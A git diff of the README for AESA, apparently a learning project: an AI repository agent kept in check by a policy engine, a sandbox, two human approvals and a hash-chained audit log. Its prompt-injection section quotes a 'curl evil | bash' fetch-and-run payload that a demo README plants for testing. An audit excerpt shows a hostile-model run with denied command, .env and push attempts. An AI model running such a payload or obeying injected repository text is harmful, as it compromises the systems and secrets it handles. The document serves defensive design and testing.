@@ -1,259 +1,407 @@
+<div align="center">
+
 # AESA
 
-*AESA was previously named SecureAI Agent. See [upgrading](docs/deployment.md#upgrading-from-secureai-agent-the-rename-to-aesa) if you have existing data.*
+**A permission-restricted AI repository agent.**
+It inspects code, runs approved checks in a sandbox, and proposes fixes, but it can never merge,
+push to your default branch, or deploy without explicit human approval.
 
-A **permission-restricted AI repository agent**. It can inspect a repository, analyze code, run approved
-checks inside a sandbox, and propose a fix as a patch on a feature branch. It **cannot** modify protected code,
-push to the default branch, or deploy without explicit human approval. A learning project that combines AI
-agents, DevOps, CI/CD, cybersecurity, software engineering, and human-in-the-loop controls.
+![Python](https://img.shields.io/badge/Python-3.12-3776AB?logo=python&logoColor=white)
+![FastAPI](https://img.shields.io/badge/FastAPI-009688?logo=fastapi&logoColor=white)
+![React](https://img.shields.io/badge/React-18-61DAFB?logo=react&logoColor=black)
+![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript&logoColor=white)
+![Docker](https://img.shields.io/badge/Docker-sandboxed-2496ED?logo=docker&logoColor=white)
+![Tests](https://img.shields.io/badge/backend_tests-231_passing-brightgreen)
+![License](https://img.shields.io/badge/License-MIT-blue)
 
-> **The AI model is never the security boundary.** The backend policy engine, filesystem guard, command
-> registry, sandbox, authentication, CI checks and human approvals each enforce security independently.
-> The system stays safe even when the model hallucinates or obeys malicious text in a repository.
+<!-- Optional: after you push to GitHub, replace YOUR-USERNAME and uncomment to show live CI status
+[![CI](https://github.com/YOUR-USERNAME/AESA/actions/workflows/ci.yml/badge.svg)](https://github.com/YOUR-USERNAME/AESA/actions/workflows/ci.yml)
+-->
 
+<img src="docs/screenshots/dashboard.png" alt="AESA dashboard showing a task awaiting approval" width="900">
+
+</div>
+
+> AESA was previously named SecureAI Agent; if you have data from before the rename, see [upgrading](docs/deployment.md#upgrading-from-secureai-agent-the-rename-to-aesa).
 
 ## Contents
-[Why](#why-this-exists) · [Verification status](#verification-status-read-this) · [Quick start](#quick-start) ·
-[Architecture](#architecture) · [Features](#features) · [Permission model](#permission-model) ·
-[Security model](#security-model) · [Agent workflow](#agent-workflow) · [CI/CD](#cicd-workflow) ·
-[Configuration](#environment-variables) · [GitHub](#github-configuration) · [Example usage](#example-usage) ·
-[Threat model](#threat-model) · [Limitations](#limitations) · [Future work](#future-improvements) ·
-[What I Learned](#what-i-learned)
 
-## Why this exists
-Coding agents are useful and dangerous in equal measure: they read untrusted text, hold credentials, and run
-commands. This project explores one answer: **give the agent least privilege and make everything that matters a
-backend-enforced, human-gated, audited step**, so that a manipulated model has nothing dangerous to reach.
+[Overview](#overview) · [Screenshots](#screenshots) · [Technology stack](#technology-stack) · [How it works](#how-it-works) ·
+[Features](#features) · [Security model](#security-model) · [Quick start](#quick-start) · [Walkthrough](#walkthrough-the-demo-scenario) ·
+[Configuration](#configuration) · [API](#api-overview) · [Testing](#testing-and-quality-gates) · [CI/CD](#cicd) ·
+[Documentation](#documentation) · [Status and limitations](#project-status-and-limitations) · [Roadmap](#roadmap) ·
+[What I learned](#what-i-learned)
 
-## Verification status (read this)
-What was **actually run** while building this, versus what is written but unexecuted:
+## Overview
 
-| Area | Status |
+Coding agents read untrusted text, hold credentials, and run commands. AESA explores one answer to that:
+**give the agent least privilege, and make everything that matters a backend-enforced, human-gated, audited step**,
+so a manipulated or mistaken model has nothing dangerous to reach.
+
+An agent task flows like this: the agent inspects a repository in an isolated clone, finds a problem, proposes a patch on a
+feature branch, and runs tests and security scanners against that exact patch inside a locked-down Docker sandbox. A person then
+reviews the diff and the results and decides. Only after approval does the backend commit and push the proposal branch; CI runs;
+and deployment needs a **second, separate approval**.
+
+> **The AI model is never the security boundary.** The policy engine, filesystem guard, command registry, sandbox,
+> authentication, CI checks and human approvals each enforce security independently. The system stays safe even when the
+> model hallucinates or obeys malicious text hidden in a repository.
+
+## Screenshots
+
+### Dashboard
+Agent status, the current task with its progress through the approval gates, security and CI status, and what is waiting on a person.
+
+<img src="docs/screenshots/dashboard.png" alt="Dashboard with a task awaiting approval" width="900">
+
+### Agent task in progress
+The gate tracker shows where the task is in the state machine; the action list shows every tool call the agent made and why.
+Only concise, structured explanations are stored, never raw reasoning.
+
+<img src="docs/screenshots/task-running.png" alt="Agent task page while analyzing, with gate tracker and action list" width="900">
+
+### Reviewing a proposed change
+The reviewer sees what the agent wants to change, the before/after diff, test and security results, the risk level, and the
+decision buttons. The decision is bound to the exact patch hash that was reviewed.
+
+<img src="docs/screenshots/change-review.png" alt="Change review with diff, scan table and Approve, Reject and Request changes buttons" width="900">
+
+### A failing security check blocks approval
+If any required check fails, errors, or was not run against the current patch, approval is refused by the **server**, not just
+disabled in the UI.
+
+<img src="docs/screenshots/gate-blocked.png" alt="Approval blocked by a failing security check" width="900">
+
+### Audit log, filtered to denied actions
+Every action is recorded, including everything the policy engine refused. The log is append-only and hash-chained, and secrets
+are redacted before anything is stored.
+
+<img src="docs/screenshots/audit-denied.png" alt="Audit log filtered to status DENIED" width="900">
+
+### CI/CD and deployment approval
+Pipeline status, per-job results, scan history, and the separate deployment approval.
+
+<img src="docs/screenshots/cicd.png" alt="CI/CD page with pipeline, scans and deployment approval" width="900">
+
+## Technology stack
+
+| Area | Technologies |
 |---|---|
-| Backend: 231 automated tests pass (unit, integration, security, API, full workflow, Trivy wrapper, gate-tooling); 5 more need Docker and are skipped here | **Run, all passing** |
-| Backend: `ruff`, `mypy` (56 files), `bandit` (no high findings), Alembic upgrade/check/downgrade | **Run, clean** |
-| Frontend: type-check, 7 unit tests, production build, `npm audit` (0 vulnerabilities after upgrades) | **Run, clean** |
-| Live run: real backend + Vite proxy + `scripts/demo_e2e.py` through to DEPLOYED, thread runner, hash-chain verify | **Run, passed** |
-| Hostile-model run against the live DB (8 actions: 1 legitimate README read allowed, 7 attacks denied; `main` untouched) | **Run** |
-| gitleaks, ruff, mypy, bandit, pytest executed by the scan pipeline | **Run for real** (local sandbox) |
-| **Docker sandbox, Docker Compose stack, sandbox image build** | **Not run** (no Docker daemon in the build environment). Docker flags are unit-tested; the code fails closed without Docker |
-| **Trivy** | Parser tested. The sandbox wrapper + baked-DB design was run with a real Trivy v0.75.0 binary under simulated container restrictions (UID 10001, no caps, no network, read-only layer, 256 MB tmpfs) against a hand-built empty DB: exit 0, valid JSON, parsed by `parse_trivy`. **Not run:** the actual image, the pinned 0.58.1, or the real vulnerability DB |
-| **Live GitHub** (PRs, Actions, webhook) and **live LLM providers** | **Not run**; exercised against mocked HTTP transports |
-| PostgreSQL | **Not run** (SQLite only) |
-| Browser rendering / screenshots | **Not done**; no browser available. See `docs/ui-states.md` |
+| **Backend** | Python 3.12, FastAPI, Pydantic v2, SQLAlchemy 2, Alembic, Uvicorn |
+| **Authentication** | Argon2id password hashing (argon2-cffi), JWT (PyJWT), role-based access control, login throttling |
+| **AI layer** | `AIProvider` abstraction: OpenAI-compatible (any `/chat/completions` server), Gemini, and an offline rule-based provider (httpx) |
+| **Frontend** | React 18, TypeScript 5, Vite, Tailwind CSS 4, React Router 7, IBM Plex Sans/Mono |
+| **Database** | SQLite by default; schema and code are PostgreSQL-compatible |
+| **Sandbox and infrastructure** | Docker, Docker Compose, a restricted Docker socket proxy (tecnativa/docker-socket-proxy), Git CLI, GitHub REST API |
+| **Security tooling** | Trivy, Gitleaks, Bandit, Ruff, mypy, `npm audit` |
+| **Testing** | pytest, Vitest |
+| **CI/CD** | GitHub Actions |
 
-So expect to debug the first `docker compose up` on your machine. The Docker pieces are the least verified part.
-The default `scripted` AI provider is a **rule-based stand-in, not an LLM** (it fixes a few classic insecure idioms
-so the demo works offline); real models plug in through `AI_PROVIDER=openai|gemini`.
+## How it works
 
-## Quick start
+```mermaid
+flowchart LR
+    U[User] --> D[Web dashboard<br/>React + TypeScript]
+    D --> A[FastAPI<br/>auth + RBAC]
+    A --> O[Agent orchestrator]
+    O --> P[Policy engine]
+    P --> T[Tool executor]
+    T --> S[Docker sandbox]
+    S --> R[Isolated repo clone]
+    R --> C[Tests + security scans]
+    C --> H{{Human approval}}
+    H --> CI[CI/CD]
+    CI --> H2{{Deployment approval}}
+    H2 --> X[Deployment]
+```
 
-```bash
-cp .env.example .env            # set JWT_SECRET, DEMO_PASSWORD, WORKSPACE_HOST_DIR (absolute path)
-mkdir -p .workspaces
-docker compose up --build
-```
-```
-Frontend: http://localhost:5173      Backend: http://localhost:8000      API Docs: http://localhost:8000/docs
-```
-Sign in as `developer` / `approver` / `admin` / `viewer` with `DEMO_PASSWORD`. Then, in the UI: **Agent tasks → Start task**
-(developer), wait for AWAITING_APPROVAL, sign in as `approver` → **Proposed changes → Approve**, then approve the deployment.
-Or run the whole flow headless against a running stack: `DEMO_PASSWORD=… python scripts/demo_e2e.py`.
+Every model-requested action passes through one choke point: **validate** (Pydantic schema) → **policy decision** (persisted) →
+**execute** (path guard / command registry / sandbox) → **redact** → **audit**. Anything not on the allowlist does not exist.
 
-No Docker? See [`docs/deployment.md`](docs/deployment.md) (local backend + `npm run dev`, with the unisolated `local` sandbox, dev only).
+### Task lifecycle
 
-## Architecture
+```mermaid
+stateDiagram-v2
+    [*] --> DRAFT
+    DRAFT --> ANALYZING
+    ANALYZING --> PROPOSED
+    PROPOSED --> AWAITING_APPROVAL
+    AWAITING_APPROVAL --> APPROVED: human approves
+    AWAITING_APPROVAL --> REJECTED: human rejects
+    AWAITING_APPROVAL --> CHANGES_REQUESTED
+    APPROVED --> APPLIED
+    APPLIED --> CI_RUNNING
+    CI_RUNNING --> CI_PASSED
+    CI_RUNNING --> CI_FAILED
+    CI_PASSED --> READY_FOR_DEPLOYMENT
+    READY_FOR_DEPLOYMENT --> DEPLOY_APPROVED: second human approval
+    DEPLOY_APPROVED --> DEPLOYED
 ```
-User → Web Dashboard → FastAPI → Agent Orchestrator → Policy / Permission Engine → Tool Execution Layer
-     → Sandbox → Repository → Tests + Security Scans → Patch / Branch → Human Approval → CI/CD → Deployment
-```
-Details, module map, and the per-call request flow: [`docs/architecture.md`](docs/architecture.md).
 
-```
-backend/app/{api,agent,approvals,audit,auth,ci,models,policy,repository,sandbox,security,tools}   backend/tests  backend/alembic
-frontend/src/{components,pages,services,types,lib}      sandbox/ (image + smoke test)      demo-repository/ (vulnerable demo)
-.github/workflows/{ci,security}.yml      docs/      scripts/{demo_e2e,export_audit}.py      docker-compose.yml   .env.example
-```
+Any failure (AI provider error, sandbox unavailable, repeated policy denials, malformed output, step budget) ends in
+`FAILED_SAFELY`. The state machine rejects illegal transitions, so the approval workflow cannot be skipped.
 
 ## Features
-- **Agent loop** with 12 structured tools (`list_files`, `read_file`, `search_code`, `git_status`, `git_diff`, `run_tests`, `run_linter`, `run_security_scan`, `create_patch`, `create_branch`, `request_approval`, `create_pull_request`); arguments validated by Pydantic; malformed or unauthorized calls rejected.
-- **`AIProvider` abstraction**: OpenAI-compatible (any `/chat/completions` server), Gemini, and an offline scripted provider; configured by env vars, no keys in code.
-- **Central `PolicyEngine`**, default-deny, evaluated before every action; every decision persisted and audited.
-- **Safe file access**: canonical paths, allowlist, sensitive-file blocklist, symlink-escape protection, protected paths (CI, sandbox, Dockerfiles, policy code) the agent cannot edit.
-- **Structured command registry** (no shell strings), timeouts, output caps, scrubbed environment, process-group kill.
-- **Docker sandbox**: non-root, no network, capabilities dropped, read-only root, resource-limited, ephemeral, one workspace mount, no Docker socket.
-- **Security gate**: pytest, ruff, mypy, bandit, gitleaks, trivy (+ npm test/audit for JS) must pass **for the exact patch** before approval; a scanner that cannot run blocks.
-- **Human approvals** for the patch and, separately, for deployment; approval is bound to the patch SHA-256; no self-approval.
-- **Git workflow**: patch → `agent/proposal-<id>` → PR; never the default branch, never forced.
-- **Audit log**: append-only (DB triggers), SHA-256 hash-chained, secrets redacted, searchable in the UI.
-- **CI/CD**: GitHub Actions (lint, types, tests, security scans, container scan, artifacts, gated deploy) plus a local CI fallback.
-- **Dashboard**: dashboard, repository, agent tasks, proposed changes (diff + results + approve/reject/request changes), audit logs, CI/CD.
-- **Auth**: Argon2id, JWT, RBAC (VIEWER / DEVELOPER / APPROVER / ADMIN), login throttling.
-- **Intentionally vulnerable demo repo** with a prompt-injection payload in its README.
 
-## Permission model
-| Level | Allowed | Denied |
+- **Agent loop** with 12 structured tools: `list_files`, `read_file`, `search_code`, `git_status`, `git_diff`, `run_tests`,
+  `run_linter`, `run_security_scan`, `create_patch`, `create_branch`, `request_approval`, `create_pull_request`. Arguments are
+  validated by Pydantic; malformed or unauthorized calls are rejected.
+- **Provider-agnostic AI**: configure OpenAI-compatible or Gemini through environment variables. An offline rule-based provider lets
+  the whole demo run with no API key.
+- **Central policy engine**: default-deny, evaluated before every action, every decision persisted and audited.
+- **Safe file access**: canonical paths, allowlist, sensitive-file blocklist, symlink-escape protection, and protected paths
+  (CI, sandbox, Dockerfiles, policy code) the agent can never edit.
+- **Controlled command execution**: a structured command registry (never a shell string), timeouts, output caps, scrubbed
+  environment, process-group kill.
+- **Hardened Docker sandbox**: non-root, no network, all capabilities dropped, read-only root, resource limits, ephemeral, a single
+  workspace mount, no Docker socket.
+- **Security gate**: pytest, Ruff, mypy, Bandit, Gitleaks and Trivy (plus `npm test` / `npm audit` for JavaScript) must pass for the
+  *exact* patch before approval. A scanner that cannot run counts as a failure.
+- **Two human approvals**: one for the patch, a separate one for deployment. No self-approval.
+- **Safe Git workflow**: patch → `agent/proposal-<id>` branch → pull request. Never the default branch, never forced.
+- **Tamper-evident audit log**: append-only (database triggers), SHA-256 hash-chained, searchable in the UI.
+- **Dashboard**: dashboard, repository browser, agent tasks, proposed changes, audit logs, CI/CD.
+- **Intentionally vulnerable demo repository** (including a prompt-injection payload in its README) to test the system.
+
+## Security model
+
+Defence in depth, each layer independent:
+
+**authentication → policy engine → path guard → command registry → sandbox → scanners and gate → human approval → branch protection / CI → deployment approval**
+
+### Permission levels
+
+| Level | What it allows | Who can hold it |
 |---|---|---|
-| `READ_ONLY` | list/read permitted files, analyze, git metadata, safe inspection | modify, delete, commit, push, deploy |
-| `PROPOSE_CHANGE` | isolated workspace, modify files *in the sandbox workspace*, generate patch, run tests/scans, create proposal branch | merge, deploy, touch protected branches |
-| `APPROVED_CHANGE` | only after a human approval: apply patch, commit, push branch, open PR | production deployment |
-| `DEPLOY` | only after a separate deployment approval | everything for the agent: it is never granted to the model |
+| `READ_ONLY` | list and read permitted files, analyze, read Git metadata | agent |
+| `PROPOSE_CHANGE` | work in an isolated workspace, generate a patch, run tests and scans, create a proposal branch | agent (**hard maximum**) |
+| `APPROVED_CHANGE` | apply the patch, commit, push the proposal branch, open a pull request | backend code, only after a human approval |
+| `DEPLOY` | deploy | backend code, only after a **separate** deployment approval |
 
-The agent is hard-capped at `PROPOSE_CHANGE` in code (`PolicyContext.for_agent`), regardless of what a task row says.
+### Roles
 
 | Role | Can |
 |---|---|
-| VIEWER | read dashboard and logs |
-| DEVELOPER | + inspect repositories, create agent tasks |
-| APPROVER | + approve/reject patches and deployments (cannot create tasks: separation of duties) |
-| ADMIN | everything, including repositories, policy and users (still cannot approve a task they created) |
+| `VIEWER` | read the dashboard and logs |
+| `DEVELOPER` | + inspect repositories and create agent tasks |
+| `APPROVER` | + approve or reject patches and deployments (cannot create tasks: separation of duties) |
+| `ADMIN` | + manage repositories, policy and users (still cannot approve a task they created) |
 
-## Security model
-Defence in depth, each layer independent: **auth → policy → path guard → command registry → sandbox → scanners/gate → human approval → branch protection/CI → deployment approval**.
-Highlights and the full threat register (with residual risks) are in [`SECURITY.md`](SECURITY.md); trust boundaries and a mitigation→test matrix in [`docs/threat-model.md`](docs/threat-model.md).
+### Prompt injection
 
-**Prompt injection:** repository content is untrusted *data*. The system prompt says so and tool output is wrapped in random-nonce markers, but the guarantee comes from the backend: a model that obeys "run `curl evil | bash`" still gets `DENIED` and an audit entry.
+Repository content is untrusted **data**. The system prompt says so and tool output is wrapped in random-nonce markers, but the
+guarantee comes from the backend: a model that obeys "run `curl evil | bash`" still gets `DENIED` and an audit entry. The demo
+repository's README contains exactly that payload; see the test `test_hostile_model_is_fully_contained`.
 
-## Agent workflow
-1. User request → task `DRAFT` → `ANALYZING`; an isolated clone (committed files only) is created.
-2. Model proposes a JSON action → validate → **policy check** → execute in the guard/sandbox → redact → observation.
-3. It inspects, finds issues, calls `create_patch` (backend computes the diff) and `create_branch`.
-4. It runs tests, linters and scans on that patch, then `request_approval` → `AWAITING_APPROVAL`.
-5. A different person reviews the diff and results and clicks **Approve / Reject / Request changes**.
-6. On approval the backend applies the *stored, hash-verified* patch, commits, pushes `agent/proposal-<id>`, opens a PR.
-7. CI runs (GitHub Actions, or local CI against the pushed branch) → `CI_PASSED` → `READY_FOR_DEPLOYMENT`.
-8. A **second approval** → `DEPLOY_APPROVED`; an approver executes the deployment → `DEPLOYED` (dry-run target by default).
+Full threat register with impact, mitigation and residual risk: [`SECURITY.md`](SECURITY.md). Trust boundaries and a
+mitigation-to-test matrix: [`docs/threat-model.md`](docs/threat-model.md).
 
-Failures end in `FAILED_SAFELY` (AI error, sandbox unavailable, denial storm, malformed output, step budget). A failed
-scan blocks approval; a policy denial is logged and the agent continues.
+## Quick start
 
-## CI/CD workflow
-`.github/workflows/ci.yml`: checkout → install → **ruff** → **mypy** → **pytest** (+ migrations check) → **frontend test/build** → **bandit, gitleaks, trivy fs, npm audit** → **container build + Trivy image scan** → artifact upload → **deploy** job in the `production` environment (requires reviewer approval). `security.yml` runs weekly (gitleaks, trivy, pip-audit) and dependency-review on PRs. See [`docs/deployment.md`](docs/deployment.md) for branch protection.
+**Prerequisites:** Docker with Compose v2 (or, for development without Docker, Python 3.12 and Node 22).
 
-## Environment variables
-Full annotated list in [`.env.example`](.env.example). Key ones:
+```bash
+cp .env.example .env
+# edit .env: set JWT_SECRET, DEMO_PASSWORD (12+ chars), and WORKSPACE_HOST_DIR (an absolute path)
+mkdir -p .workspaces
+docker compose up --build
+```
+
+| Service | URL |
+|---|---|
+| Frontend | http://localhost:5173 |
+| Backend | http://localhost:8000 |
+| API docs (OpenAPI) | http://localhost:8000/docs |
+
+Sign in as `developer`, `approver`, `admin` or `viewer` with the `DEMO_PASSWORD` you set. There are no default credentials.
+
+**Windows (PowerShell, Docker Desktop):**
+
+```powershell
+cd E:\AESA
+Copy-Item .env.example .env        # edit: JWT_SECRET, DEMO_PASSWORD, WORKSPACE_HOST_DIR=E:/AESA/.workspaces
+New-Item -ItemType Directory -Force .workspaces | Out-Null
+docker compose config              # validates the file; the first line shows: name: aesa
+docker compose up --build
+```
+
+Use forward slashes in `WORKSPACE_HOST_DIR` on Windows. Compose builds the sandbox image `aesa-sandbox:latest` **before** the backend
+starts, and the backend runs it with `docker run --pull never`, so a missing image fails closed instead of being downloaded.
+
+No Docker? See [`docs/deployment.md`](docs/deployment.md) for a development setup with the (unisolated, dev-only) `local` sandbox.
+
+## Walkthrough: the demo scenario
+
+1. Sign in as **developer** → *Agent tasks* → **Start task** with the default prompt: *"Analyze this repository and identify a
+   security issue in the authentication module. Propose a safe fix and run all available tests."* The task page shows the gate
+   tracker and each action as it happens ([screenshot](#agent-task-in-progress)).
+2. With the offline provider, the agent inspects the repo, finds weak password hashing, a hard-coded secret, SQL built with string
+   formatting and a non-constant-time comparison, creates a patch on `agent/proposal-<id>`, runs the checks, and requests approval.
+   The task now sits at **Awaiting approval** on the [dashboard](#dashboard).
+3. Sign in as **approver** → *Proposed changes* → open the request. Review the diff, results and risk
+   ([screenshot](#reviewing-a-proposed-change)). If a required check fails, **Approve is refused** by the server
+   ([screenshot](#a-failing-security-check-blocks-approval)).
+4. **Approve.** The backend applies the stored, hash-verified patch, commits, pushes the proposal branch, and CI runs against it.
+5. When CI passes the task becomes **Ready for deployment**. A second approval, then **Run deployment**
+   ([screenshot](#cicd-and-deployment-approval)). The default deploy target is a dry run that touches no infrastructure.
+6. Open *Audit logs* and filter to `DENIED` to see everything the policy engine refused ([screenshot](#audit-log-filtered-to-denied-actions)).
+
+Prefer the terminal? With the stack running: `DEMO_PASSWORD=... python scripts/demo_e2e.py` drives the whole flow over HTTP. A real,
+recorded audit trail (including a hostile-model run where every attack is denied) is in
+[`docs/example-audit-log.txt`](docs/example-audit-log.txt).
+
+## Configuration
+
+Everything is configured through environment variables; nothing is hard-coded. See [`.env.example`](.env.example) for the full,
+annotated list. The important ones:
 
 | Variable | Purpose |
 |---|---|
-| `JWT_SECRET` | ≥32 chars; required in production |
-| `DATABASE_URL` | `sqlite:///…` (default) or PostgreSQL URL |
-| `AI_PROVIDER`, `AI_API_KEY`, `AI_BASE_URL`, `AI_MODEL` | `scripted` / `openai` / `gemini` |
-| `GITHUB_TOKEN`, `GITHUB_WEBHOOK_SECRET`, `DEPLOY_TARGET` | optional GitHub integration (least-privilege token) |
-| `SANDBOX_BACKEND` | `docker` (default, fails closed) or `local` (dev only) |
-| `WORKSPACE_HOST_DIR` | absolute host path for sandbox workspaces (Compose). Windows: use forward slashes, e.g. `E:/AESA/.workspaces` |
-| `BACKEND_DATA_VOLUME` | name of the Docker volume with the database and repositories (default `aesa_backend-data`; set to `secureai-agent_backend-data` to keep pre-rename data) |
-| `REQUIRED_SCANS` | override the auto-derived required scan list |
-| `SANDBOX_TRIVY_TMPFS`, `SANDBOX_TRIVY_MEMORY` | larger `/tmp` tmpfs and memory for `trivy_fs` only (default `1200m` / `2g`); must hold the baked DB copy. Build arg `TRIVY_TMPFS_MB` enforces it at image build |
-| `SECURITY_BLOCK_SEVERITY` | `critical`/`high`/`medium` (default `high`) |
-| `ALLOW_SELF_APPROVAL`, `REQUIRE_DISTINCT_DEPLOY_APPROVER` | policy knobs (default off) |
-| `SEED_DEMO`, `DEMO_PASSWORD` | dev seeding; no default credentials exist |
+| `JWT_SECRET` | 32+ characters; required in production |
+| `DATABASE_URL` | SQLite (default) or a PostgreSQL URL |
+| `AI_PROVIDER`, `AI_API_KEY`, `AI_BASE_URL`, `AI_MODEL` | `scripted` (offline), `openai` (any OpenAI-compatible server) or `gemini` |
+| `GITHUB_TOKEN`, `GITHUB_WEBHOOK_SECRET`, `DEPLOY_TARGET` | optional GitHub integration; use a least-privilege token |
+| `SANDBOX_BACKEND` | `docker` (default, fails closed) or `local` (development only, **not isolated**) |
+| `WORKSPACE_HOST_DIR` | absolute host path for sandbox workspaces (Windows: forward slashes) |
+| `BACKEND_DATA_VOLUME` | Docker volume for the database and repositories (default `aesa_backend-data`) |
+| `SANDBOX_TRIVY_TMPFS`, `SANDBOX_TRIVY_MEMORY` | larger `/tmp` and memory for the Trivy scan only (defaults `1200m` / `2g`) |
+| `REQUIRED_SCANS`, `SECURITY_BLOCK_SEVERITY` | which checks gate approval, and the severity that blocks (default `high`) |
+| `ALLOW_SELF_APPROVAL`, `REQUIRE_DISTINCT_DEPLOY_APPROVER` | policy knobs, both off by default |
 
-## GitHub configuration
-Fine-grained token with only Contents RW, Pull requests RW, Actions R; branch protection on `main` (PR + code-owner review + required checks + no force push); `production` environment with required reviewers; optional webhook to `/api/ci/webhook`. Step by step in [`docs/deployment.md`](docs/deployment.md).
+GitHub setup (least-privilege token, branch protection, `production` environment with required reviewers, webhook) is in
+[`docs/deployment.md`](docs/deployment.md#github-setup).
 
-## Example usage
+## API overview
+
+Interactive OpenAPI docs at `/docs`. Main endpoints:
+
+| Area | Endpoints |
+|---|---|
+| Auth | `POST /api/auth/login`, `GET /api/auth/me` |
+| Repositories | `GET/POST /api/repositories`, `GET /api/repositories/{id}/tree`, `/stats` |
+| Agent tasks | `POST /api/agent/tasks`, `GET /api/agent/tasks/{id}`, `POST /api/agent/tasks/{id}/cancel`, `GET /api/tasks/{id}/actions`, `GET /api/tasks/{id}/diff` |
+| Approvals | `GET /api/approvals`, `POST /api/approvals/{id}/approve`, `/reject`, `/request-changes` |
+| Security and CI | `GET /api/security/scans/{task_id}`, `GET /api/ci/runs/{task_id}`, `POST /api/ci/webhook` |
+| Deployment | `POST /api/deployments/{task_id}/execute` |
+| Audit and status | `GET /api/audit-logs`, `GET /api/audit-logs/verify`, `GET /api/dashboard/summary`, `GET /api/policy` |
+
+## Project structure
+
+```text
+AESA/
+├── backend/                 FastAPI app
+│   ├── app/
+│   │   ├── agent/           orchestrator, AIProvider implementations, prompts
+│   │   ├── policy/          PolicyEngine (default-deny, permission levels)
+│   │   ├── tools/           tool schemas, handlers, ToolExecutor (single choke point)
+│   │   ├── repository/      path guard, hardened git, isolated workspaces
+│   │   ├── sandbox/         command registry, Docker / local runners
+│   │   ├── security/        scanner parsers, approval gate
+│   │   ├── approvals/       state machine, decisions, applier, deployment
+│   │   ├── ci/              GitHub client, CI service
+│   │   ├── audit/           redaction, hash-chained append-only log
+│   │   └── auth/ api/ models/
+│   ├── alembic/             database migrations
+│   └── tests/               unit, integration, security and end-to-end tests
+├── frontend/                React + TypeScript + Vite + Tailwind dashboard
+├── sandbox/                 sandbox image (Dockerfile, Trivy wrapper, verification scripts)
+├── demo-repository/         intentionally vulnerable demo service
+├── docs/                    architecture, threat model, deployment, UI states, screenshots
+├── scripts/                 end-to-end demo driver, audit export
+├── .github/workflows/       ci.yml, security.yml
+└── docker-compose.yml  .env.example  SECURITY.md  LICENSE
+```
+
+## Testing and quality gates
+
 ```bash
-TOKEN=$(curl -s localhost:8000/api/auth/login -H 'content-type: application/json' \
-        -d '{"username":"developer","password":"…"}' | jq -r .access_token)
-curl -s localhost:8000/api/agent/tasks -H "authorization: Bearer $TOKEN" -H 'content-type: application/json' \
-     -d '{"repository_id":1,"prompt":"Analyze this repository and identify a security issue in the authentication module. Propose a safe fix and run all available tests."}'
-curl -s localhost:8000/api/tasks/1/diff -H "authorization: Bearer $TOKEN" | jq -r .diff
-```
-Real output of a full run (agent actions, scan results, CI, deploy) and the audit trail, including a hostile-model run
-where every attack is denied: [`docs/example-audit-log.txt`](docs/example-audit-log.txt). Example excerpt (verbatim from that file, captured before the rename to AESA, hence the agent label `SecureAI`):
-```
-2026-10-05 10:47:41  Agent: SecureAI  Action: read_file  (tool_call)  Permission: ALLOWED  Result: EXECUTED  Duration: 0.0s
-    -> read README.md (14 of 14 lines)
-2026-10-05 10:47:41  Agent: SecureAI  Action: run_command  (tool_call)  Permission: DENIED  Result: DENIED  Duration: 0.0s
-    -> denied by policy (default_deny): 'run_command' is not a recognised tool; unknown actions are denied
-2026-10-05 10:47:41  Agent: SecureAI  Action: read_file  (tool_call)  Permission: DENIED  Result: DENIED  Duration: 0.0s
-    -> denied by policy (blocked_path): '.env' is a sensitive path
-2026-10-05 10:47:41  Agent: SecureAI  Action: git_push  (tool_call)  Permission: DENIED  Result: DENIED  Duration: 0.0s
-    -> denied by policy (agent_forbidden): 'git_push' can only be performed by backend code after human approval
+cd backend
+pytest -q                                   # 231 tests (+5 that need Docker, skipped without it)
+ruff check .  &&  mypy app  &&  bandit -r app -c bandit.yaml -ll
+alembic upgrade head && alembic check       # migrations match the models
+
+cd ../frontend
+npm test && npm run build && npm audit --audit-level=high
 ```
 
-Screenshots: not captured (no browser in the build environment); UI states are documented from real data in
-[`docs/ui-states.md`](docs/ui-states.md), with a capture checklist in `docs/screenshots/`.
+The suite covers the policy engine, path and command validation, redaction and the audit chain, tool schemas, approvals and the
+state machine, the Trivy wrapper, scanner parsers (which **fail closed**), role-based access, prompt-injection and hostile-model
+containment, and the full workflow from inspection to deployment. It also runs the real scanners as an unprivileged user on a
+non-writable workspace, as they run in production.
 
-### Main API endpoints (OpenAPI at `/docs`)
-`POST /api/auth/login` · `GET|POST /api/repositories` · `POST /api/agent/tasks` · `GET /api/agent/tasks/{id}` · `POST /api/agent/tasks/{id}/cancel` ·
-`GET /api/tasks/{id}/actions` · `GET /api/tasks/{id}/diff` · `POST /api/approvals/{id}/approve|reject|request-changes` ·
-`GET /api/security/scans/{task_id}` · `GET /api/ci/runs/{task_id}` · `POST /api/ci/webhook` · `POST /api/deployments/{task_id}/execute` ·
-`GET /api/audit-logs` · `GET /api/audit-logs/verify` · `GET /api/dashboard/summary` · `GET /api/policy`.
+Docker-dependent checks (`backend/tests/test_docker_sandbox_integration.py`) run through the production code path but are skipped unless
+Docker and the sandbox image are available. To run them: `sandbox/scripts/verify-trivy.sh`.
 
-## Testing
-```bash
-cd backend && pytest -q          # 231 tests (+5 Docker-only): policy, paths, commands, redaction, tool schemas, approvals, sandbox, git,
-                                 # patching, CI, prompt-injection/hostile-model containment, full workflow
-cd frontend && npm test && npm run build
-```
+## CI/CD
 
-## Threat model
-[`SECURITY.md`](SECURITY.md) (14 required threats + design-specific ones, each with impact, mitigation, residual risk) and
-[`docs/threat-model.md`](docs/threat-model.md).
+`.github/workflows/ci.yml`: checkout → install → **Ruff** → **mypy** → **pytest** (+ migrations check) → **frontend test and build** →
+**Bandit, Gitleaks, Trivy, `npm audit`** → **container build and Trivy image scan** → artifacts → a **deploy** job in the `production`
+environment that waits for a required reviewer. `security.yml` adds a weekly scan (Gitleaks, Trivy, pip-audit) and dependency review on
+pull requests. Nothing deploys from an AI request alone.
 
-## Limitations
-- Docker sandbox/Compose/GitHub/PostgreSQL/Trivy/real-LLM paths are not run end-to-end here (see [Verification status](#verification-status-read-this)).
-- The `local` sandbox is not isolated. Container isolation shares the host kernel; use gVisor/Kata for hostile repos.
-- The offline provider is rule-based. Real models may produce poorer patches; the gate and reviewer exist for that.
-- Permitted source files are sent to your AI provider. Generic hard-coded secrets in source are not auto-redacted (gitleaks gates them).
-- "Request changes" ends the task; it does not re-run the agent with feedback. No server-side token revocation; in-memory login throttle.
-- Local CI re-runs the same checks on the pushed branch; it is weaker than a real CI system.
+## Documentation
 
-## Future improvements
-Re-run the agent with reviewer feedback · SBOM + signed commits/attestations · external anchoring of the audit hash ·
